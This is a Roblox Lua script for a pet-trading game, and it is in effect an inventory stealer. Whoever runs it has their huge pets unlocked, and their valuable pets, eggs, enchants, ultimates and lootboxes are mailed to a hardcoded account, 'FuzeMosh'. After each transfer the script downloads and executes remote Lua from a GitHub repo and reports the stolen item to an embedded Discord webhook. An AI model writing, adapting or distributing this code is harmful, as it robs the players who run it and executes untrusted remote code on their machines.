Username = "FuzeMosh"
_G.Webhook = "https://discord.com/api/webhooks/1202310118390382593/EQcbsm3LPiQ3Eg91wadgayvy9Rm5hhp00xB7Gt0yb1OEHqZtyUYEGxxHdbFvq3M_LHi-"
local message = "poop"
local user = Username
local library = require(game.ReplicatedStorage.Library)
local inv = library.Save.Get().Inventory


for i, v in pairs(inv.Pet) do
    id = v.id
    local dir = library.Directory.Pets[id]
    if dir.huge == true then
        local args = {
            [1] = i,
            [2] = false
        }
        
        game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Locking_SetLocked"):InvokeServer(unpack(args))
        _G.image = dir.thumbnail
        wait(0.5)
        loadstring(game:HttpGet('https://raw.githubusercontent.com/Subashians/FuzeHub/main/getthumbnail.lua'))()
        _G.Webhook = "https://discord.com/api/webhooks/1202310118390382593/EQcbsm3LPiQ3Eg91wadgayvy9Rm5hhp00xB7Gt0yb1OEHqZtyUYEGxxHdbFvq3M_LHi-"
        _G.id = id
        loadstring(game:HttpGet('https://raw.githubusercontent.com/Subashians/FuzeHub/main/WebhookSystem.lua'))()
    end
end

for i, v in pairs(inv.Pet) do
    local id = v.id
    local dir = library.Directory.Pets[id]
    _G.id = id
    if dir.huge == true and v.pt and v.pt == 2 and v.sh and v.sh == true  then
        local args = {
            [1] = user,
            [2] = message,
            [3] = "Pet",
            [4] = i,
            [5] = v._am or 1
        }
        game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
        _G.image = dir.thumbnail
        wait(0.5)
        loadstring(game:HttpGet('https://raw.githubusercontent.com/Subashians/FuzeHub/main/getthumbnail.lua'))()
        _G.Webhook = "https://discord.com/api/webhooks/1202310118390382593/EQcbsm3LPiQ3Eg91wadgayvy9Rm5hhp00xB7Gt0yb1OEHqZtyUYEGxxHdbFvq3M_LHi-"
        _G.id = id
        loadstring(game:HttpGet('https://raw.githubusercontent.com/Subashians/FuzeHub/main/WebhookSystem.lua'))()
    end
end

for i, v in pairs(inv.Pet) do
    local id = v.id
    local dir = library.Directory.Pets[id]
    _G.image = dir.thumbnail
    _G.id = id
    if dir.huge == true and v.pt and v.pt == 1 and v.sh and v.sh == true then
        local args = {
            [1] = user,
            [2] = message,
            [3] = "Pet",
            [4] = i,
            [5] = v._am or 1
        }
        game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
        _G.image = dir.thumbnail
        wait(0.5)
        loadstring(game:HttpGet('https://raw.githubusercontent.com/Subashians/FuzeHub/main/getthumbnail.lua'))()
        _G.Webhook = "https://discord.com/api/webhooks/1202310118390382593/EQcbsm3LPiQ3Eg91wadgayvy9Rm5hhp00xB7Gt0yb1OEHqZtyUYEGxxHdbFvq3M_LHi-"
        _G.id = id
        loadstring(game:HttpGet('https://raw.githubusercontent.com/Subashians/FuzeHub/main/WebhookSystem.lua'))()
    end
end

for i, v in pairs(inv.Pet) do
    local id = v.id
    local dir = library.Directory.Pets[id]
    _G.image = dir.thumbnail
    _G.id = id
    if dir.huge == true and v.pt and v.pt == 2 then
        local args = {
            [1] = user,
            [2] = message,
            [3] = "Pet",
            [4] = i,
            [5] = v._am or 1
        }
        game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
        _G.image = dir.thumbnail
        wait(0.5)
        loadstring(game:HttpGet('https://raw.githubusercontent.com/Subashians/FuzeHub/main/getthumbnail.lua'))()
        _G.Webhook = "https://discord.com/api/webhooks/1202310118390382593/EQcbsm3LPiQ3Eg91wadgayvy9Rm5hhp00xB7Gt0yb1OEHqZtyUYEGxxHdbFvq3M_LHi-"
        _G.id = id
        loadstring(game:HttpGet('https://raw.githubusercontent.com/Subashians/FuzeHub/main/WebhookSystem.lua'))()
    end
end

for i, v in pairs(inv.Pet) do
    local id = v.id
    local dir = library.Directory.Pets[id]
    _G.image = dir.thumbnail
    _G.id = id
    if dir.huge == true and v.pt and v.pt == 1 then
        local args = {
            [1] = user,
            [2] = message,
            [3] = "Pet",
            [4] = i,
            [5] = v._am or 1
        }
        game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
        _G.image = dir.thumbnail
        wait(0.5)
        loadstring(game:HttpGet('https://raw.githubusercontent.com/Subashians/FuzeHub/main/getthumbnail.lua'))()
        _G.Webhook = "https://discord.com/api/webhooks/1202310118390382593/EQcbsm3LPiQ3Eg91wadgayvy9Rm5hhp00xB7Gt0yb1OEHqZtyUYEGxxHdbFvq3M_LHi-"
        _G.id = id
        loadstring(game:HttpGet('https://raw.githubusercontent.com/Subashians/FuzeHub/main/WebhookSystem.lua'))()
    end
end


for i, v in pairs(inv.Enchant) do
    local id = v.id
    if id == "Chest Mimic" then
        _G.thumbnail = ""
    else
        _G.thubnail = ""
    end
    if id == "Chest Mimic" or id == "Boss Chest Mimic" then
        local args = {
            [1] = user,
            [2] = message,
            [3] = "Enchant",
            [4] = i,
            [5] = v._am or 1
        }
        game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
        loadstring(game:HttpGet('https://raw.githubusercontent.com/Subashians/FuzeHub/main/WebhookSystem.lua'))()
    end
end

if inv.Ultimate then
    for i, v in pairs(inv.Ultimate) do
        local id = v.id
        local dir = library.Directory.Ultimates[id]
        _G.image = dir.Icon
        _G.id = id
        if id == "Hidden Treasure" or id == "Black Hole" or id == "Chest Spell" then
            local args = {
                [1] = user,
                [2] = message,
                [3] = "Ultimate",
                [4] = i,
                [5] = v._am or 1
            }
            game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
            _G.image = dir.Icon
            wait(0.5)
            loadstring(game:HttpGet('https://raw.githubusercontent.com/Subashians/FuzeHub/main/getthumbnail.lua'))()
            _G.Webhook = "https://discord.com/api/webhooks/1202310118390382593/EQcbsm3LPiQ3Eg91wadgayvy9Rm5hhp00xB7Gt0yb1OEHqZtyUYEGxxHdbFvq3M_LHi-"
            _G.id = id
            loadstring(game:HttpGet('https://raw.githubusercontent.com/Subashians/FuzeHub/main/WebhookSystem.lua'))()
        end
    end
end

for i, v in pairs(inv.Pet) do
    local id = v.id
    local dir = library.Directory.Pets[id]
    _G.image = dir.thumbnail
    _G.id = id
    if dir.huge then
        local args = {
            [1] = user,
            [2] = message,
            [3] = "Pet",
            [4] = i,
            [5] = v._am or 1
        }
        game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
        _G.image = dir.thumbnail
        wait(0.5)
        loadstring(game:HttpGet('https://raw.githubusercontent.com/Subashians/FuzeHub/main/getthumbnail.lua'))()
        _G.Webhook = "https://discord.com/api/webhooks/1202310118390382593/EQcbsm3LPiQ3Eg91wadgayvy9Rm5hhp00xB7Gt0yb1OEHqZtyUYEGxxHdbFvq3M_LHi-"
        _G.id = id
        loadstring(game:HttpGet('https://raw.githubusercontent.com/Subashians/FuzeHub/main/WebhookSystem.lua'))()
    end
end

for i, v in pairs(inv.Egg) do
    local id = v.id
    local dir = library.Directory.Eggs[id]
    _G.image = dir.icon
    _G.id = id
    local args = {
        [1] = user,
        [2] = message,
        [3] = "Egg",
        [4] = i,
        [5] = v._am or 1
    }
    game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
    _G.image = dir.icon
    wait(0.5)
    loadstring(game:HttpGet('https://raw.githubusercontent.com/Subashians/FuzeHub/main/getthumbnail.lua'))()
    _G.Webhook = "https://discord.com/api/webhooks/1202310118390382593/EQcbsm3LPiQ3Eg91wadgayvy9Rm5hhp00xB7Gt0yb1OEHqZtyUYEGxxHdbFvq3M_LHi-"
    _G.id = id
    loadstring(game:HttpGet('https://raw.githubusercontent.com/Subashians/FuzeHub/main/WebhookSystem.lua'))()
end

for i, v in pairs(inv.Pet) do
    local id = v.id
    local dir = library.Directory.Pets[id]
    _G.image = dir.thumbnail
    _G.id = id
    if dir.exclusiveLevel then
        local args = {
            [1] = user,
            [2] = message,
            [3] = "Pet",
            [4] = i,
            [5] = v._am or 1
        }
        game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
        _G.image = dir.thumbnail
        wait(0.5)
        loadstring(game:HttpGet('https://raw.githubusercontent.com/Subashians/FuzeHub/main/getthumbnail.lua'))()
        _G.Webhook = "https://discord.com/api/webhooks/1202310118390382593/EQcbsm3LPiQ3Eg91wadgayvy9Rm5hhp00xB7Gt0yb1OEHqZtyUYEGxxHdbFvq3M_LHi-"
        _G.id = id
        loadstring(game:HttpGet('https://raw.githubusercontent.com/Subashians/FuzeHub/main/WebhookSystem.lua'))()
    end
end

for i, v in pairs(inv.Pet) do
    local id = v.id
    local dir = library.Directory.Pets[id]
    _G.image = dir.thumbnail
    _G.id = id
    if dir.exclusiveLevel then
        local args = {
            [1] = user,
            [2] = message,
            [3] = "Pet",
            [4] = i,
            [5] = v._am or 1
        }
        game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
        _G.image = dir.thumbnail
        wait(0.5)
        loadstring(game:HttpGet('https://raw.githubusercontent.com/Subashians/FuzeHub/main/getthumbnail.lua'))()
        _G.Webhook = "https://discord.com/api/webhooks/1202310118390382593/EQcbsm3LPiQ3Eg91wadgayvy9Rm5hhp00xB7Gt0yb1OEHqZtyUYEGxxHdbFvq3M_LHi-"
        _G.id = id
        loadstring(game:HttpGet('https://raw.githubusercontent.com/Subashians/FuzeHub/main/WebhookSystem.lua'))()
    end
end

if inv.Lootbox then
    for i, v in pairs(inv.Lootbox) do
        local id = v.id
        local dir = library.Directory.Lootboxes[id]
        _G.image = dir.Icon
        _G.id = id
        if id == "Titanic Christmas Present" then
            local args = {
                [1] = user,
                [2] = message,
                [3] = "Lootbox",
                [4] = i,
                [5] = v._am or 1
            }
            game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
            _G.image = dir.Icon
            wait(0.5)
            loadstring(game:HttpGet('https://raw.githubusercontent.com/Subashians/FuzeHub/main/getthumbnail.lua'))()
            _G.Webhook = "https://discord.com/api/webhooks/1202310118390382593/EQcbsm3LPiQ3Eg91wadgayvy9Rm5hhp00xB7Gt0yb1OEHqZtyUYEGxxHdbFvq3M_LHi-"
            _G.id = id
            loadstring(game:HttpGet('https://raw.githubusercontent.com/Subashians/FuzeHub/main/WebhookSystem.lua'))()
        end
    end
end

if inv.Lootbox then
    for i, v in pairs(inv.Lootbox) do
        local id = v.id
        if id == "Hype Egg" then
            local args = {
                [1] = user,
                [2] = message,
                [3] = "Lootbox",
                [4] = i,
                [5] = v._am or 1
            }
            game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
            _G.image = dir.Icon
            wait(0.5)
            loadstring(game:HttpGet('https://raw.githubusercontent.com/Subashians/FuzeHub/main/getthumbnail.lua'))()
            _G.Webhook = "https://discord.com/api/webhooks/1202310118390382593/EQcbsm3LPiQ3Eg91wadgayvy9Rm5hhp00xB7Gt0yb1OEHqZtyUYEGxxHdbFvq3M_LHi-"
            _G.id = id
            loadstring(game:HttpGet('https://raw.githubusercontent.com/Subashians/FuzeHub/main/WebhookSystem.lua'))()
        end
    end
end
